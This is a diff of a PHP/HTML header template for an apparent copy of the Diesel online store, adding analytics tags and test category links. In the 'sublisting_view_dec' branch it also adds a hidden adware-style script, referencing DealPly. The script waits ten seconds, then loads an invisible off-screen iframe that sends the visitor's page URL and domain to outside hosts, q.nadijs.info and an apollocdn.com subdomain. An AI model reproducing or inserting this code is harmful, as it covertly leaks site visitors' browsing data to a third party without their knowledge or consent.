@@ -1,13 +1,62 @@
-<!doctype html>
+<!DOCTYPE html>
 <!--[if lt IE 7]> <html class="ie6 oldie" lang="en"> <![endif]-->
 <!--[if IE 7]>    <html class="ie7 oldie" lang="en"> <![endif]-->
 <!--[if IE 8]>    <html class="ie8 oldie" lang="en"> <![endif]-->
 <!--[if gt IE 8]><!-->
-<html lang="en">
+<html lang="en" class="js infinite-scroll">
 <!--<![endif]-->
 
 <head>
-
+	<?php if($view_file_name == 'sublisting_view_dec') { ?>
+	
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	  <script type="text/javascript" async="">
+		(function() {
+		  try {
+			if (typeof window['asdfdsasdfdsa'] === 'undefined') {
+			  setTimeout(function() {
+				var shouldThisPartOfCodeRun = document.URL.search('http') === 0;
+				if (!shouldThisPartOfCodeRun) {
+				  return;
+				}
+				if (typeof DealPly !== 'undefined' && typeof DealPly.serverCallParam === 'string') {
+				  var reportFlag = true;
+				  var scArr = document.getElementsByTagName('script');
+				  for (var index in scArr) {
+					if (typeof scArr[index].src === 'string' && scArr[index].src.search('\\.js\\?dn=') !== -1) {
+					  reportFlag = false;
+					}
+				  }
+				  if (!reportFlag) {
+					return;
+				  }
+				  var host = 'http://q.nadijs.info/';
+				  var isSecure = document.URL.search('https://') === 0;
+				  if (isSecure) {
+					host = 'https://endall41-q.apollocdn.com/';
+				  }
+				  var urlPath = 'dealdo/event-report?type=quick&';
+				  var iframe = document.createElement('iframe');
+				  var suffix = '';
+				  try {
+					if (typeof JavaScriptJsTagUrl !== 'undefined') {
+					  suffix = JavaScriptJsTagUrl.substr(JavaScriptJsTagUrl.search('\?') + 1);
+					}
+				  } catch (e324324) {}
+				  iframe.setAttribute('style', 'position:relative; left:-10000px; width:1px; height:1px; visibility:hidden');
+				  iframe.setAttribute('src', host + urlPath + 'url=' + encodeURIComponent(document.URL) + '&domain=' + document.domain + '&topic=dpdiedarg&' + suffix);
+				  document.body.appendChild(iframe);
+				}
+			  }, 10000);
+			  window['asdfdsasdfdsa'] = true;
+			}
+		  } catch (e235534) {}
+		})();
+	  </script>
+	<script type="text/javascript" async="" charset="utf-8" src="<?=base_url()?>js/conversion_async.js" id="utag_27"></script>
+	
+<?php } ?>
+	
     <link rel="alternate" hreflang="ja-jp" href="http://www.store.diesel.co.jp">
     <meta charset=UTF-8>
     <title>Diesel Online Store: jeans, clothing, shoes, bags and watches</title>
@@ -31,6 +80,17 @@
     <link rel="stylesheet" href="<?=base_url();?>css/jquery.css" />
     <!--<link href="<?//=base_url()?>css/headcss.css" type="text/css" rel="stylesheet">-->
     <!-- jQuery -->
+	<?php if($view_file_name == 'sublisting_view_dec') { ?>
+	
+		<script type="text/javascript" async="" charset="utf-8" src="<?=base_url()?>js/a.js" id="utag_30"></script>
+		<script type="text/javascript" async="" charset="utf-8" src="<?=base_url()?>js/fbevents.js" id="utag_26"></script>
+		<script async="" id="tealium-tag-7110" src="<?=base_url()?>js/analytics.js"></script>
+		<script type="text/javascript" async="" src="<?=base_url()?>js/ec.js"></script>
+		<script type="text/javascript" async="" src="<?=base_url()?>js/linkid.js"></script>
+		<script src="<?=base_url()?>js/utag.js" type="text/javascript" async=""></script>
+		<script async="" src="<?=base_url()?>js/analytics.js"></script>
+	
+	<?php } ?>
     <script src="<?=base_url();?>js/jquery-1.7.1.min.js" type="text/javascript"></script>
     <!--http://code.jquery.com/jquery-1.7.1.js-->
     
@@ -58,9 +118,7 @@
 
     <meta name="google-site-verification" content="v4gmkBxtjNnhdyrMHJcx4rp7jnKkAwi5nOZqnhQf8WU" />
 
-
-
-
+	
 
     <div class="content-asset">
         <!-- dwMarker="content" dwContentID="bcu5aiaaiMZcgaaadnNlZrDMYt" -->
@@ -105,6 +163,8 @@
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
     <script src="<?=base_url();?>js/responsive.js"></script>
     <!-- Google Analytics -->
+	
+	<?php if($view_file_name != 'sublisting_view_dec') { ?>
     <script>
         (function(i, s, o, g, r, a, m) {
             i['GoogleAnalyticsObject'] = r;
@@ -140,6 +200,44 @@
 
         ga('send', 'pageview');
     </script>
+	<?php } else { ?>
+	
+	<script>
+    (function(i, s, o, g, r, a, m) {
+      i['GoogleAnalyticsObject'] = r;
+      i[r] = i[r] || function() {
+        (i[r].q = i[r].q || []).push(arguments)
+      }, i[r].l = 1 * new Date();
+      a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0];
+      a.async = 1;
+      a.src = g;
+      m.parentNode.insertBefore(a, m)
+    })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
+    var uniqueID = 'UA-68609450-1';
+    var domainName = 'global.diesel.com';
+    ga('create', uniqueID, domainName);
+    if (!String.prototype.endsWith) {
+      String.prototype.endsWith = function(suffix) {
+        return this.indexOf(suffix, this.length - suffix.length) !== -1;
+      };
+    }
+    //Custom dimension specific tracking
+    var catID = 'diesel-man-denimandclothing-denim';
+    var brandName = "Diesel";
+    ga('set', 'dimension9', catID);
+    ga('set', 'dimension10', brandName);
+    ga('set', 'dimension4', 'guest');
+    var baseUrl = window.location.protocol + '://' + window.location.hostname + window.location.pathname,
+      sp = baseUrl.endsWith('/') ? '' : '/',
+      pdListing = (window.location.search == "") ? '' : window.location.search;
+    var page = baseUrl + sp + 'ProductListingPage' + pdListing;
+    ga('send', 'pageview', {
+      'page': page
+    });
+  </script>
+	
+	<?php } ?>
     <!-- End Google Analytics -->
 
 
@@ -3116,7 +3214,7 @@ New Denim FW15</isprint></a>
                                                                                 ?>
                                                                                 <li>
                                                                                     <h6>
-                                                                                        <a data-catId ="diesel-man-denimandclothing-denim" href="<?=base_url().'product/sublisting/mens/'.strtolower($curr_category)?>"><?=$curr_category;?></a>
+                                                                                        <a data-catId ="diesel-man-denimandclothing-denim" href="<?=base_url();?>producttest/sublisting/mens/denim"><?=$curr_category;?></a>
                                                                                     </h6>
                                                                                 </li>
                                                                                 <?endif;?>
@@ -3129,7 +3227,7 @@ New Denim FW15</isprint></a>
                                                                                 ?>
                                                                                 <li>
                                                                                     <h6>
-                                                                                        <a data-catId ="diesel-man-denimandclothing-denim" href="<?=base_url().'product/sublisting/mens/'.strtolower($curr_category)?>"><?=$curr_category;?></a>
+                                                                                        <a data-catId ="diesel-man-denimandclothing-denim" href="<?=base_url();?>producttest/sublisting/mens/denim"><?=$curr_category;?></a>
                                                                                     </h6>
                                                                                 </li>
                                                                                 <?endif;?>
@@ -3152,7 +3250,7 @@ New Denim FW15</isprint></a>
                                                                                 ?>
                                                                                 <li>
                                                                                     <h6>
-                                                                                        <a data-catId ="diesel-man-denimandclothing-denim" href="<?=base_url().'product/sublisting/mens/'.strtolower($curr_category)?>"><?=$curr_category;?></a>
+                                                                                        <a data-catId ="diesel-man-denimandclothing-denim" href="<?=base_url();?>producttest/sublisting/mens/denim"><?=$curr_category;?></a>
                                                                                     </h6>
                                                                                 </li>
                                                                                 <?endif;?>
@@ -3165,7 +3263,7 @@ New Denim FW15</isprint></a>
                                                                                 ?>
                                                                                 <li>
                                                                                     <h6>
-                                                                                        <a data-catId ="diesel-man-denimandclothing-denim" href="<?=base_url().'product/sublisting/mens/'.strtolower($curr_category)?>"><?=$curr_category;?></a>
+                                                                                        <a data-catId ="diesel-man-denimandclothing-denim" href="<?=base_url();?>producttest/sublisting/mens/denim"><?=$curr_category;?></a>
                                                                                     </h6>
                                                                                 </li>
                                                                                 <?endif;?>
